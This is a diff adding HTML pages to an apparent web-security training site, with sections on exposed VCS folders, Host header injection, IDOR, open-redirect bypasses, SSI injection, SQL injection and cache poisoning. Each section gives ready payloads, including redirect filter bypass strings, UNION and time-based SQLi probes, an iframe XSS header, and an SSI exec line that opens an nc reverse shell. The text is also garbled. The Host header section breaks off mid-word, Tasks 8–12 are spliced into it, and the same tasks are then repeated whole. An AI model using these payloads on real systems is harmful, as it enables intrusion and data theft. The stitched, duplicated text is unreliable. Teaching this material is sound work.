+                    src="https://1.bp.blogspot.com/-4FaqUeTlv4k/XliKHBOpgmI/AAAAAAAAATQ/sLdwhvSF-Jgn0WF5P-PouLp6uTeHUAOWACLcBGAsYHQ/s1600/1.png"
+                    alt="HG folder"
+                  />
+                </li>
+                <li>
+                  <p>Exposed Bazaar folder</p>
+                  <pre><code>http://target.com/.bzr</code></pre>
+                  <p>
+                    Tools to dump .bzr:
+                    <a href="https://github.com/shpik-kr/bzr_dumper">bzr_dumper</a>
+                  </p>
+                  <img
+                    src="https://1.bp.blogspot.com/-67WO_kL_iB8/XliKl1jggAI/AAAAAAAAATc/mWBw7igq05EdKR3JZmbXYN4LqjpBOrESgCLcBGAsYHQ/s1600/1.png"
+                    alt="BZR folder"
+                  />
+                </li>
+                <li>
+                  <p>Exposed Darcs folder</p>
+                  <pre><code>http://target.com/_darcs</code></pre>
+                  <p>Tools to dump _darcs (Not found)</p>
+                </li>
+                <li>
+                  <p>Exposed Bitkeeper folder</p>
+                  <pre><code>http://target.com/Bitkeeper</code></pre>
+                  <p>Tools to dump BitKeeper (Not found)</p>
+                </li>
+              </ol>
+      
+              <h2>Reference</h2>
+              <ul>
+                <li>
+                  <a href="https://www.nakanosec.com/2020/02/exposed-source-code-pada-website.html">
+                    NakanoSec (my own post)
+                  </a>
+                </li>
+              </ul>
+          </div>
       </div>
-      <div class="content">{% block body %} {% endblock %}</div>
-    </section>
+      <div class="task" id="task7">
+        <div class="task-title" onclick="toggleTask('task7')">
+            Task 7: HTTP Host Header Attacks
+            <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="task-content">
+            <h2>Introduction</h2>
+            <p>
+              HTTP Host header attacks exploit vulnerable websites that handle the
+              value of the Host header in an unsafe way. If the server implicitly
+              trusts the Host header, and fails to validate or escape it properly,
+              an attacker may be able to use this input to inject harmful payloads
+              that manipulate server-side behavior. Attacks that involve injecting a
+              payload directly into the Host header are often known as "Host header
+              injection" attacks.
+            </p>
+    
+            <h2>How to exploit</h2>
+            <ol>
+              <li>
+                <p>Change the host header</p>
+                <pre><code>GET /index.php HTTP/1.1
+    Host: evil-website.com
+    ...</code></pre>
+              </li>
+              <li>
+                <p>Duplicating the host header</p>
+                <pre><code>GET /index.php HTTP/1.1
+    Host: vulnerable-website.com
+    Host: evil-website.com
+    ...</code></pre>
+              </li>
+              <li>
+                <p>Add line wrapping</p>
+                <pre><code>GET /index.php HTTP/1.1
+    Host: vulnerable-website.com
+    Host: evil-website.com
+    ...</code></pre>
+              </li>
+              <li>
+                <p>Add host override headers</p>
+                <pre><code>X-Forwarded-For: evil-website.com
+    X-Forwarded-Host: evil-website.com
+    X-Client-IP: evil-website.com
+    X-Remote-IP: evil-website.com
+    X-Remote-Addr: evil-website.com
+    X-Host: evil-website.com</code></pre>
+                <p>
+                  How to use? In this case, I'm using "X-Forwarded-For: evil.com"
+                </p>
+                <pre><code>GET /index.php HTTP/1.1
+    Host: vulnerable-website.com
+    X-Forwarded-For: evil-website.com
+    ...</code></pre>
+              </li>
+              <li>
+                <p>Supply an abs
+                  <div class="task" id="task8">
+    <div class="task-title" onclick="toggleTask('task8')">
+        Task 8: Introduction to IDOR
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            IDOR stands for Insecure Direct Object Reference is a security
+            vulnerability in which a user is able to access and make changes to
+            data of any other user present in the system.
+        </p>
 
-    <script src="{% static 'script.js'%}"></script>
-  </body>
-</html>
+        <h2>Where to find</h2>
+        <ul>
+            <li>Usually it can be found in APIs.</li>
+            <li>
+                Check the HTTP request that contain unique ID, for example
+                <code>user_id</code> or <code>id</code>
+            </li>
+        </ul>
+
+        <h2>How to exploit</h2>
+        <ol>
+            <li>
+                <p>Add parameters onto the endpoints for example, if there was</p>
+                <pre><code>GET /api/v1/getuser HTTP/1.1
+Host: example.com
+...</code></pre>
+                <pre><code>GET /api/v1/getuser?id=1234 HTTP/1.1
+Host: example.com
+...</code></pre>
+            </li>
+            <li>
+                <p>HTTP Parameter pollution</p>
+                <pre><code>POST /api/get_profile HTTP/1.1
+Host: example.com
+...
+user_id=hacker_id&user_id=victim_id
+</code></pre>
+            </li>
+            <li>
+                <p>Add .json to the endpoint</p>
+                <pre><code>GET /v2/GetData/1234 HTTP/1.1
+Host: example.com
+...</code></pre>
+                <pre><code>GET /v2/GetData/1234.json HTTP/1.1
+Host: example.com
+...</code></pre>
+            </li>
+            <li>Test on outdated API Versions</li>
+            <li>Wrap the ID with an array.</li>
+            <li>Wrap the ID with a JSON object</li>
+            <li>JSON Parameter Pollution</li>
+            <li>Try decode the ID, if the ID encoded using md5,base64,etc</li>
+            <li>If the website using GraphQL, try to find IDOR using GraphQL</li>
+            <li>MFLAC (Missing Function Level Access Control)</li>
+            <li>Try to swap uuid with number</li>
+            <li>Change HTTP Method</li>
+            <li>Path traversal</li>
+            <li>Change request <code>Content-Type</code></li>
+            <li>Send wildcard instead of ID</li>
+            <li>Try google dorking to find new endpoint</li>
+        </ol>
+        <h2>References</h2>
+        <ul>
+            <li>
+                <a href="https://twitter.com/swaysThinking">@swaysThinking</a> and
+                other medium writeup
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task9">
+    <div class="task-title" onclick="toggleTask('task9')">
+        Task 9: Introduction to Open Redirection Vulnerabilities
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            Open redirection vulnerabilities arise when an application incorporates
+            user-controllable data into the target of a redirection in an unsafe way.
+            An attacker can construct a URL within the application that causes a
+            redirection to an arbitrary external domain.
+        </p>
+
+        <h2>Where to find</h2>
+        <ul>
+            <li>Sometimes it can be found in login / register / logout pages</li>
+            <li>Checking the JavaScript source code</li>
+        </ul>
+
+        <h2>How to exploit</h2>
+        <ol>
+            <li>
+                <p>Try change the domain</p>
+                <pre><code>/?redir=evil.com</code></pre>
+            </li>
+            <li>
+                <p>Using a whitelisted domain or keyword</p>
+                <pre><code>/?redir=target.com.evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>//</code> to bypass <code>http</code> blacklisted keyword
+                </p>
+                <pre><code>/?redir=//evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>https:</code> to bypass <code>//</code> blacklisted
+                    keyword
+                </p>
+                <pre><code>/?redir=https:evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>\\</code> to bypass <code>//</code> blacklisted keyword
+                </p>
+                <pre><code>/?redir=\\evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>\/\/</code> to bypass <code>//</code> blacklisted keyword
+                </p>
+                <pre><code>/?redir=\/\/evil.com/</code></pre>
+                <pre><code>/?redir=/\/evil.com/</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>%E3%80%82</code> to bypass <code>.</code> blacklisted
+                    character
+                </p>
+                <pre><code>/?redir=evil。com</code></pre>
+                <pre><code>/?redir=evil%E3%80%82com</code></pre>
+            </li>
+            <li>
+                <p>Using null byte <code>%00</code> to bypass blacklist filter</p>
+                <pre><code>/?redir=//evil%00.com</code></pre>
+            </li>
+            <li>
+                <p>Using parameter pollution</p>
+                <pre><code>/?next=target.com&next=evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>@</code> or <code>%40</code> character, browser will
+                    redirect to anything after the <code>@</code>
+                </p>
+                <pre><code>/?redir=target.com@evil.com</code></pre>
+                <pre><code>/?redir=target.com%40evil.com</code></pre>
+            </li>
+            <li>
+                <p>Creating folder as their domain</p>
+                <pre><code>http://www.yoursite.com/http://www.theirsite.com/</code></pre>
+                <pre><code>http://www.yoursite.com/folder/www.folder.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>?</code> character, browser will translate it to
+                    <code>/?</code>
+                </p>
+                <pre><code>/?redir=target.com?evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Bypass the filter if it only checks for domain name using
+                    <code>%23</code>
+                </p>
+                <pre><code>/?redir=target.com%23evil.com</code></pre>
+            </li>
+            <li>
+                <p>Host/Split Unicode Normalization</p>
+                <pre><code>https://evil.c℀.example.com</code></pre>
+            </li>
+            <li>
+                <p>Using parsing</p>
+                <pre><code>http://ⓔⓥⓘⓛ.ⓒⓞⓜ</code></pre>
+            </li>
+            <li>
+                <p>Using <code>°</code> symbol to bypass</p>
+                <pre><code>/?redir=target.com/°evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Bypass the filter if it only allows you to control the path using a
+                    nullbyte <code>%0d</code> or <code>%0a</code>
+                </p>
+                <pre><code>/?redir=/%0d/evil.com</code></pre>
+            </li>
+        </ol>
+
+        <h2>References</h2>
+        <ul>
+            <li>
+                <a href="https://hackerone.com/reports/1250758">Hackerone #1250758</a>
+            </li>
+            <li>
+                <a
+                    href="https://medium.com/@ahmadbrainworks/bug-bounty-how-i-earned-550-in-less-than-5-minutes-open-redirect-chained-with-rxss-8957979070e5"
+                    >@ahmadbrainworks article</a
+                >
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task10">
+    <div class="task-title" onclick="toggleTask('task10')">
+        Task 10: Introduction to SSI (Server Side Includes) Injection
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            SSI (Server Side Includes) Injection is a type of web security
+            vulnerability that occurs when a web application allows untrusted
+            user-supplied data to be used as part of a Server Side Include (SSI)
+            directive.
+        </p>
+
+        <h2>Where to find</h2>
+        <p>
+            Usually it can be found anywhere. Just try to input the payload in the
+            form or GET parameter.
+        </p>
+
+        <h2>How to exploit</h2>
+        <div class="scrollable">
+            <ol>
+                <li>
+                    <p>Print a date</p>
+                    <pre><code>&lt;!--#echo var="DATE_LOCAL" --&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Print all the variables</p>
+                    <pre><code>&lt;!--#printenv --&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Include a file</p>
+                    <pre><code>&lt;!--#include file="includefile.html" --&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Doing a reverse shell</p>
+                    <pre><code>&lt;!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo" --&gt;</code></pre>
+                </li>
+            </ol>
+        </div>
+
+        <h2>References</h2>
+        <ul>
+            <li>
+                <a href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection">OWASP</a>
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task11">
+    <div class="task-title" onclick="toggleTask('task11')">
+        Task 11: Introduction to SQL Injection (Advanced)
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            SQL Injection (SQLi) is a severe web security vulnerability that allows an attacker
+            to interfere with the queries that an application makes to its database. It occurs when
+            user-supplied input is incorrectly filtered for string literal escape characters embedded
+            in SQL statements. This allows attackers to manipulate the application's SQL query to execute
+            arbitrary SQL code, thereby gaining unauthorized access to the database.
+        </p>
+
+        <h2>Types of SQL Injection</h2>
+        <ul>
+            <li><strong>In-band SQLi (Classic SQLi):</strong> This is the most common type of SQLi,
+                where the attacker uses the same channel to launch the attack and gather results.</li>
+            <li><strong>Error-based SQLi:</strong> Attackers provoke error messages from the database to
+                gather information about its structure and data.</li>
+            <li><strong>Union-based SQLi:</strong> Attackers leverage the UNION SQL operator to combine the
+                results of two SELECT statements, allowing them to retrieve data from other tables.</li>
+            <li><strong>Inferential SQLi (Blind SQLi):</strong> The attacker can deduce whether the payload
+                executed had an effect on the database without directly querying the database.</li>
+            <li><strong>Boolean-based (content-based) Blind SQLi:</strong> The application behaves differently
+                depending on whether the SQL query returns true or false. The attacker exploits this behavior
+                to infer information about the database.</li>
+            <li><strong>Time-based Blind SQLi:</strong> The attacker infers information by measuring the time
+                taken by the application to respond to specific SQL queries.</li>
+            <li><strong>Out-of-band SQLi:</strong> Attackers use alternate channels to exfiltrate data from the
+                database when standard SQL injection techniques are not applicable.</li>
+        </ul>
+
+        <h2>Where to find</h2>
+        <p>
+            SQL Injection vulnerabilities can exist in any part of the application where user-supplied data
+            is used to construct SQL queries. This includes login forms, search fields, product listings, and
+            any other input field that interacts with a database.
+        </p>
+
+        <h2>How to exploit</h2>
+
+        <h3>GET Parameters</h3>
+
+        <h4>Error-Based SQLi</h4>
+
+        <p>Error-based SQLi leverages error messages returned by the database to gather information.
+            For example, appending a single quote ' to a parameter value may trigger a syntax error if
+            the application does not properly handle it.</p>
+        <pre><code>http://vulnerable-website.com/products?id=5'</code></pre>
+
+        <h4>Union-Based SQLi</h4>
+
+        <p>Union-based SQLi involves injecting a UNION SELECT statement to combine results from different
+            tables. This technique allows attackers to retrieve data from tables they would not normally have
+            access to.</p>
+        <pre><code>http://vulnerable-website.com/products?id=-1 UNION SELECT 1,2,3</code></pre>
+
+        <!-- Add more exploitation techniques here -->
+
+        <h4>Blind SQL Injection</h4>
+
+        <p>Blind SQL Injection techniques exploit the application's behavior rather than directly returning
+            data from the database. Attackers may use boolean-based or time-based techniques to infer
+            information about the database.</p>
+        <pre><code>http://vulnerable-website.com/products?id=5 AND 1=1 --</code></pre>
+        <pre><code>http://vulnerable-website.com/products?id=5 AND SLEEP(5) --</code></pre>
+
+        <!-- Add more advanced exploitation techniques here -->
+
+        <h2>Prevention</h2>
+        <p>To prevent SQL Injection, developers should use parameterized queries or prepared statements
+            with bound parameters. Additionally, input validation and proper escaping of user-supplied data
+            are crucial to mitigate this vulnerability.</p>
+
+        <h2>References</h2>
+        <ul>
+            <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQL Injection</a></li>
+            <li><a href="https://portswigger.net/web-security/sql-injection">PortSwigger SQL Injection</a></li>
+            <li><a href="https://www.acunetix.com/websitesecurity/sql-injection/">Acunetix SQL Injection</a></li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task12">
+    <div class="task-title" onclick="toggleTask('task12')">
+        Task 12: Introduction to Web Cache Poisoning (Advanced)
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            Web cache poisoning is a sophisticated attack aimed at manipulating caching mechanisms to
+            serve malicious content to unsuspecting users. The attacker's goal is to inject harmful
+            data into a web cache, which, when served to other users, can lead to various security
+            breaches, such as cross-site scripting (XSS), remote code execution (RCE), or information
+            disclosure.
+        </p>
+        
+        <h2>How to exploit</h2>
+        
+        <h3>Basic Poisoning</h3>
+        <p>In basic poisoning, the attacker manipulates the HTTP request headers to insert malicious
+            content into the cache. This content is then served to subsequent users, causing them to
+            execute the injected payload.</p>
+        <pre><code>GET / HTTP/1.1
+Host: www.vuln.com
+X-Forwarded-Host: evil.com</code></pre>
+        <p>The response is:</p>
+        <pre><code>HTTP/1.1 200 OK
+Cache-Control: public, no-cache
+…
+&lt;img href="https://evil.com/a.png" /&gt;</code></pre>
+        
+        <h3>Selective Poisoning</h3>
+        <p>In selective poisoning, the attacker crafts a more sophisticated payload that targets
+            specific components of the response, such as headers or HTML tags. This allows the attacker
+            to bypass certain security measures and execute the payload in a more discreet manner.</p>
+        <pre><code>GET / HTTP/1.1
+Host: redacted.com
+User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
+X-Forwarded-Host: a"&gt;&lt;iframe onload=alert(1)&gt;
+</code></pre>
+        <p>The response is:</p>
+        <pre><code>HTTP/1.1 200 OK
+X-Served-By: cache-lhr6335-LHR
+Vary: User-Agent, Accept-Encoding
+…
+&lt;link rel="canonical" href="https://a"&gt;a&lt;iframe onload=alert(1)&gt;</code></pre>
+        
+        <!-- Add more advanced exploitation techniques here -->
+        
+        <h2>Prevention</h2>
+        <p>To prevent web cache poisoning, web developers and administrators should implement strict
+            input validation, sanitize user-supplied data, and configure caching mechanisms to
+            behave securely. Additionally, regularly auditing and monitoring web cache behavior
+            can help detect and mitigate potential poisoning attempts.</p>
+        
+        <h2>References</h2>
+        <ul>
+            <li><a href="https://portswigger.net/web-security/web-cache-poisoning">PortSwigger - Web Cache Poisoning</a></li>
+            <li><a href="https://owasp.org/www-community/attacks/Web_Cache_Poisoning">OWASP - Web Cache Poisoning</a></li>
+            <li><a href="https://www.acunetix.com/blog/web-security-zone/cache-poisoning-vulnerabilities/">Acunetix - Cache Poisoning Vulnerabilities</a></li>
+        </ul>
+    </div>
+</div>olute URL</p>
+                <pre><code>GET https://vulnerable-website.com/ HTTP/1.1
+    Host: evil-website.com
+    ...</code></pre>
+              </li>
+            </ol>
+    
+            <h2>References</h2>
+            <ul>
+              <li>
+                <a href="https://portswigger.net/web-security/host-header/exploiting">
+                  PortSwigger
+                </a>
+              </li>
+            </ul>
+        </div>
+    </div>
+    <div class="task" id="task8">
+    <div class="task-title" onclick="toggleTask('task8')">
+        Task 8: Introduction to IDOR
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            IDOR stands for Insecure Direct Object Reference is a security
+            vulnerability in which a user is able to access and make changes to
+            data of any other user present in the system.
+        </p>
+
+        <h2>Where to find</h2>
+        <ul>
+            <li>Usually it can be found in APIs.</li>
+            <li>
+                Check the HTTP request that contain unique ID, for example
+                <code>user_id</code> or <code>id</code>
+            </li>
+        </ul>
+
+        <h2>How to exploit</h2>
+        <ol>
+            <li>
+                <p>Add parameters onto the endpoints for example, if there was</p>
+                <pre><code>GET /api/v1/getuser HTTP/1.1
+Host: example.com
+...</code></pre>
+                <pre><code>GET /api/v1/getuser?id=1234 HTTP/1.1
+Host: example.com
+...</code></pre>
+            </li>
+            <li>
+                <p>HTTP Parameter pollution</p>
+                <pre><code>POST /api/get_profile HTTP/1.1
+Host: example.com
+...
+user_id=hacker_id&user_id=victim_id
+</code></pre>
+            </li>
+            <li>
+                <p>Add .json to the endpoint</p>
+                <pre><code>GET /v2/GetData/1234 HTTP/1.1
+Host: example.com
+...</code></pre>
+                <pre><code>GET /v2/GetData/1234.json HTTP/1.1
+Host: example.com
+...</code></pre>
+            </li>
+            <li>Test on outdated API Versions</li>
+            <li>Wrap the ID with an array.</li>
+            <li>Wrap the ID with a JSON object</li>
+            <li>JSON Parameter Pollution</li>
+            <li>Try decode the ID, if the ID encoded using md5,base64,etc</li>
+            <li>If the website using GraphQL, try to find IDOR using GraphQL</li>
+            <li>MFLAC (Missing Function Level Access Control)</li>
+            <li>Try to swap uuid with number</li>
+            <li>Change HTTP Method</li>
+            <li>Path traversal</li>
+            <li>Change request <code>Content-Type</code></li>
+            <li>Send wildcard instead of ID</li>
+            <li>Try google dorking to find new endpoint</li>
+        </ol>
+        <h2>References</h2>
+        <ul>
+            <li>
+                <a href="https://twitter.com/swaysThinking">@swaysThinking</a> and
+                other medium writeup
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task9">
+    <div class="task-title" onclick="toggleTask('task9')">
+        Task 9: Introduction to Open Redirection Vulnerabilities
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            Open redirection vulnerabilities arise when an application incorporates
+            user-controllable data into the target of a redirection in an unsafe way.
+            An attacker can construct a URL within the application that causes a
+            redirection to an arbitrary external domain.
+        </p>
+
+        <h2>Where to find</h2>
+        <ul>
+            <li>Sometimes it can be found in login / register / logout pages</li>
+            <li>Checking the JavaScript source code</li>
+        </ul>
+
+        <h2>How to exploit</h2>
+        <ol>
+            <li>
+                <p>Try change the domain</p>
+                <pre><code>/?redir=evil.com</code></pre>
+            </li>
+            <li>
+                <p>Using a whitelisted domain or keyword</p>
+                <pre><code>/?redir=target.com.evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>//</code> to bypass <code>http</code> blacklisted keyword
+                </p>
+                <pre><code>/?redir=//evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>https:</code> to bypass <code>//</code> blacklisted
+                    keyword
+                </p>
+                <pre><code>/?redir=https:evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>\\</code> to bypass <code>//</code> blacklisted keyword
+                </p>
+                <pre><code>/?redir=\\evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>\/\/</code> to bypass <code>//</code> blacklisted keyword
+                </p>
+                <pre><code>/?redir=\/\/evil.com/</code></pre>
+                <pre><code>/?redir=/\/evil.com/</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>%E3%80%82</code> to bypass <code>.</code> blacklisted
+                    character
+                </p>
+                <pre><code>/?redir=evil。com</code></pre>
+                <pre><code>/?redir=evil%E3%80%82com</code></pre>
+            </li>
+            <li>
+                <p>Using null byte <code>%00</code> to bypass blacklist filter</p>
+                <pre><code>/?redir=//evil%00.com</code></pre>
+            </li>
+            <li>
+                <p>Using parameter pollution</p>
+                <pre><code>/?next=target.com&next=evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>@</code> or <code>%40</code> character, browser will
+                    redirect to anything after the <code>@</code>
+                </p>
+                <pre><code>/?redir=target.com@evil.com</code></pre>
+                <pre><code>/?redir=target.com%40evil.com</code></pre>
+            </li>
+            <li>
+                <p>Creating folder as their domain</p>
+                <pre><code>http://www.yoursite.com/http://www.theirsite.com/</code></pre>
+                <pre><code>http://www.yoursite.com/folder/www.folder.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Using <code>?</code> character, browser will translate it to
+                    <code>/?</code>
+                </p>
+                <pre><code>/?redir=target.com?evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Bypass the filter if it only checks for domain name using
+                    <code>%23</code>
+                </p>
+                <pre><code>/?redir=target.com%23evil.com</code></pre>
+            </li>
+            <li>
+                <p>Host/Split Unicode Normalization</p>
+                <pre><code>https://evil.c℀.example.com</code></pre>
+            </li>
+            <li>
+                <p>Using parsing</p>
+                <pre><code>http://ⓔⓥⓘⓛ.ⓒⓞⓜ</code></pre>
+            </li>
+            <li>
+                <p>Using <code>°</code> symbol to bypass</p>
+                <pre><code>/?redir=target.com/°evil.com</code></pre>
+            </li>
+            <li>
+                <p>
+                    Bypass the filter if it only allows you to control the path using a
+                    nullbyte <code>%0d</code> or <code>%0a</code>
+                </p>
+                <pre><code>/?redir=/%0d/evil.com</code></pre>
+            </li>
+        </ol>
+
+        <h2>References</h2>
+        <ul>
+            <li>
+                <a href="https://hackerone.com/reports/1250758">Hackerone #1250758</a>
+            </li>
+            <li>
+                <a
+                    href="https://medium.com/@ahmadbrainworks/bug-bounty-how-i-earned-550-in-less-than-5-minutes-open-redirect-chained-with-rxss-8957979070e5"
+                    >@ahmadbrainworks article</a
+                >
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task10">
+    <div class="task-title" onclick="toggleTask('task10')">
+        Task 10: Introduction to SSI (Server Side Includes) Injection
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            SSI (Server Side Includes) Injection is a type of web security
+            vulnerability that occurs when a web application allows untrusted
+            user-supplied data to be used as part of a Server Side Include (SSI)
+            directive.
+        </p>
+
+        <h2>Where to find</h2>
+        <p>
+            Usually it can be found anywhere. Just try to input the payload in the
+            form or GET parameter.
+        </p>
+
+        <h2>How to exploit</h2>
+        <div class="scrollable">
+            <ol>
+                <li>
+                    <p>Print a date</p>
+                    <pre><code>&lt;!--#echo var="DATE_LOCAL" --&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Print all the variables</p>
+                    <pre><code>&lt;!--#printenv --&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Include a file</p>
+                    <pre><code>&lt;!--#include file="includefile.html" --&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Doing a reverse shell</p>
+                    <pre><code>&lt;!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo" --&gt;</code></pre>
+                </li>
+            </ol>
+        </div>
+
+        <h2>References</h2>
+        <ul>
+            <li>
+                <a href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection">OWASP</a>
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task11">
+    <div class="task-title" onclick="toggleTask('task11')">
+        Task 11: Introduction to SQL Injection (Advanced)
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            SQL Injection (SQLi) is a severe web security vulnerability that allows an attacker
+            to interfere with the queries that an application makes to its database. It occurs when
+            user-supplied input is incorrectly filtered for string literal escape characters embedded
+            in SQL statements. This allows attackers to manipulate the application's SQL query to execute
+            arbitrary SQL code, thereby gaining unauthorized access to the database.
+        </p>
+
+        <h2>Types of SQL Injection</h2>
+        <ul>
+            <li><strong>In-band SQLi (Classic SQLi):</strong> This is the most common type of SQLi,
+                where the attacker uses the same channel to launch the attack and gather results.</li>
+            <li><strong>Error-based SQLi:</strong> Attackers provoke error messages from the database to
+                gather information about its structure and data.</li>
+            <li><strong>Union-based SQLi:</strong> Attackers leverage the UNION SQL operator to combine the
+                results of two SELECT statements, allowing them to retrieve data from other tables.</li>
+            <li><strong>Inferential SQLi (Blind SQLi):</strong> The attacker can deduce whether the payload
+                executed had an effect on the database without directly querying the database.</li>
+            <li><strong>Boolean-based (content-based) Blind SQLi:</strong> The application behaves differently
+                depending on whether the SQL query returns true or false. The attacker exploits this behavior
+                to infer information about the database.</li>
+            <li><strong>Time-based Blind SQLi:</strong> The attacker infers information by measuring the time
+                taken by the application to respond to specific SQL queries.</li>
+            <li><strong>Out-of-band SQLi:</strong> Attackers use alternate channels to exfiltrate data from the
+                database when standard SQL injection techniques are not applicable.</li>
+        </ul>
+
+        <h2>Where to find</h2>
+        <p>
+            SQL Injection vulnerabilities can exist in any part of the application where user-supplied data
+            is used to construct SQL queries. This includes login forms, search fields, product listings, and
+            any other input field that interacts with a database.
+        </p>
+
+        <h2>How to exploit</h2>
+
+        <h3>GET Parameters</h3>
+
+        <h4>Error-Based SQLi</h4>
+
+        <p>Error-based SQLi leverages error messages returned by the database to gather information.
+            For example, appending a single quote ' to a parameter value may trigger a syntax error if
+            the application does not properly handle it.</p>
+        <pre><code>http://vulnerable-website.com/products?id=5'</code></pre>
+
+        <h4>Union-Based SQLi</h4>
+
+        <p>Union-based SQLi involves injecting a UNION SELECT statement to combine results from different
+            tables. This technique allows attackers to retrieve data from tables they would not normally have
+            access to.</p>
+        <pre><code>http://vulnerable-website.com/products?id=-1 UNION SELECT 1,2,3</code></pre>
+
+        <!-- Add more exploitation techniques here -->
+
+        <h4>Blind SQL Injection</h4>
+
+        <p>Blind SQL Injection techniques exploit the application's behavior rather than directly returning
+            data from the database. Attackers may use boolean-based or time-based techniques to infer
+            information about the database.</p>
+        <pre><code>http://vulnerable-website.com/products?id=5 AND 1=1 --</code></pre>
+        <pre><code>http://vulnerable-website.com/products?id=5 AND SLEEP(5) --</code></pre>
+
+        <!-- Add more advanced exploitation techniques here -->
+
+        <h2>Prevention</h2>
+        <p>To prevent SQL Injection, developers should use parameterized queries or prepared statements
+            with bound parameters. Additionally, input validation and proper escaping of user-supplied data
+            are crucial to mitigate this vulnerability.</p>
+
+        <h2>References</h2>
+        <ul>
+            <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQL Injection</a></li>
+            <li><a href="https://portswigger.net/web-security/sql-injection">PortSwigger SQL Injection</a></li>
+            <li><a href="https://www.acunetix.com/websitesecurity/sql-injection/">Acunetix SQL Injection</a></li>
+        </ul>
+    </div>
+</div>
+<div class="task" id="task12">
+    <div class="task-title" onclick="toggleTask('task12')">
+        Task 12: Introduction to Web Cache Poisoning (Advanced)
+        <i class="fas fa-chevron-down"></i>
+    </div>
+    <div class="task-content">
+        <h2>Introduction</h2>
+        <p>
+            Web cache poisoning is a sophisticated attack aimed at manipulating caching mechanisms to
+            serve malicious content to unsuspecting users. The attacker's goal is to inject harmful
+            data into a web cache, which, when served to other users, can lead to various security
+            breaches, such as cross-site scripting (XSS), remote code execution (RCE), or information
+            disclosure.
+        </p>
+        
+        <h2>How to exploit</h2>
+        
+        <h3>Basic Poisoning</h3>
+        <p>In basic poisoning, the attacker manipulates the HTTP request headers to insert malicious
+            content into the cache. This content is then served to subsequent users, causing them to
+            execute the injected payload.</p>
+        <pre><code>GET / HTTP/1.1
+Host: www.vuln.com
+X-Forwarded-Host: evil.com</code></pre>
+        <p>The response is:</p>
+        <pre><code>HTTP/1.1 200 OK
+Cache-Control: public, no-cache
+…
+&lt;img href="https://evil.com/a.png" /&gt;</code></pre>
+        
+        <h3>Selective Poisoning</h3>
+        <p>In selective poisoning, the attacker crafts a more sophisticated payload that targets
+            specific components of the response, such as headers or HTML tags. This allows the attacker
+            to bypass certain security measures and execute the payload in a more discreet manner.</p>
+        <pre><code>GET / HTTP/1.1
+Host: redacted.com
+User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
+X-Forwarded-Host: a"&gt;&lt;iframe onload=alert(1)&gt;
+</code></pre>
+        <p>The response is:</p>
+        <pre><code>HTTP/1.1 200 OK
+X-Served-By: cache-lhr6335-LHR
+Vary: User-Agent, Accept-Encoding
+…
+&lt;link rel="canonical" href="https://a"&gt;a&lt;iframe onload=alert(1)&gt;</code></pre>
+        
+        <!-- Add more advanced exploitation techniques here -->
+        
+        <h2>Prevention</h2>
+        <p>To prevent web cache poisoning, web developers and administrators should implement strict
+            input validation, sanitize user-supplied data, and configure caching mechanisms to
+            behave securely. Additionally, regularly auditing and monitoring web cache behavior
+            can help detect and mitigate potential poisoning attempts.</p>
+        
+        <h2>References</h2>
+        <ul>
